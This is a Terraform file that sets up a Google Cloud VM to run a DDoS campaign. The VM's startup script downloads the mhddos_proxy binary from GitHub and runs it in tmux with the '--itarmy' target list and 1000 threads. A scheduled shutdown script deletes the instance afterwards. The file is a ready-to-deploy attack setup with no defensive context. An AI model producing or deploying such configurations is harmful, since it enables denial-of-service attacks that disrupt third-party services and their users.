provider "google" {
  zone = "europe-west3-c"
}

data "google_billing_account" "itarmy" {
  display_name = "My Billing Account"
}

resource "google_project" "itarmy" {
  name       = "itarmy"
  project_id = "itarmy"

  billing_account = data.google_billing_account.itarmy.id
}

resource "google_service_account" "itarmy" {
  account_id   = "service-account"
  display_name = "Service Account"
  project      = google_project.itarmy.name
}

resource "google_project_iam_member" "itarmy" {
  project = google_project.itarmy.name
  role    = "roles/compute.instanceAdmin"
  member  = "serviceAccount:${google_service_account.itarmy.email}"
}

resource "google_project_service" "itarmy" {
  project = google_project.itarmy.name
  service = "compute.googleapis.com"
}

resource "google_compute_project_metadata" "itarmy" {
  project = google_project.itarmy.name
  metadata = {
    "ssh-keys" = "ubuntu:${file("~/.ssh/id_ed25519.pub")}"
  }
}

resource "google_compute_instance" "itarmy" {
  name         = "itarmy"
  machine_type = "e2-micro"
  project      = google_project.itarmy.name

  boot_disk {
    initialize_params {
      image = "ubuntu-os-cloud/ubuntu-2204-lts"
    }
  }

  network_interface {
    network = "default"
    access_config { network_tier = "STANDARD" }
  }

  service_account {
    email  = google_service_account.itarmy.email
    scopes = ["compute-rw"]
  }

  metadata = {
    "startup-script" = <<-EOT
      #!/usr/bin/env bash
      apt update
      timedatectl set-timezone Europe/Kiev
      shutdown -P 19:00 --no-wall
      su - ubuntu << EOF
      mkdir -p ~/bin
      wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -O ~/bin/mhddos_proxy_linux && chmod 755 ~/bin/mhddos_proxy_linux
      tmux new -ds itarmy
      tmux send 'mhddos_proxy_linux --itarmy -t 1000' Enter
      echo -e '"\\e[A": history-search-backward\n"\\e[B": history-search-forward' > .inputrc
      EOF
    EOT

    "shutdown-script" = <<-EOT
      #!/usr/bin/env bash
      ZONE=$(gcloud compute instances list --filter=$(hostname) --format 'csv[no-heading](zone)')
      gcloud compute instances delete $(hostname) --quiet --zone="$ZONE"
    EOT
  }
}
